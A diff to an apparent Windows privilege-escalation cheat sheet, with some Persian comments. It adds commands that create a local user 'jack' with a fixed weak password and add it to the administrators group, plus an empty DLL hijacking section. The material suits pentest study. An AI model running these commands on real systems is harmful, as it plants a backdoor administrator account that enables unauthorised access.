@@ -51,6 +51,8 @@ systeminfo        # System and Windows Information Like Hotfix(s)
 wmic os get Caption, Version, OSArchitecture # اطلاعات سیستم و ویندوز
 driverquery # Check the drivers
 mstsc /v:<target-ip> # Remote Desktop
+cmd.exe /k net user jack Password11 # add user 
+cmd.exe /k net user jack Password11 /add & net localgroup administrators jack /add # add user with Administrator Privilege
 --------------------------------------------------------------------------
 # Sharing files and Printers Enumeration
 net share
@@ -336,6 +338,13 @@ net user pwnd
 runas /user:pwnd cmd.exe
 runas /user:pwnd powershell.exe 
 ```
+
+## DLL Hijacking ✅
+
+> [!Note]
+> 🔹 
+
+
 ## Credentials ✅
 ## File-Unattended ✅
 ```powershell
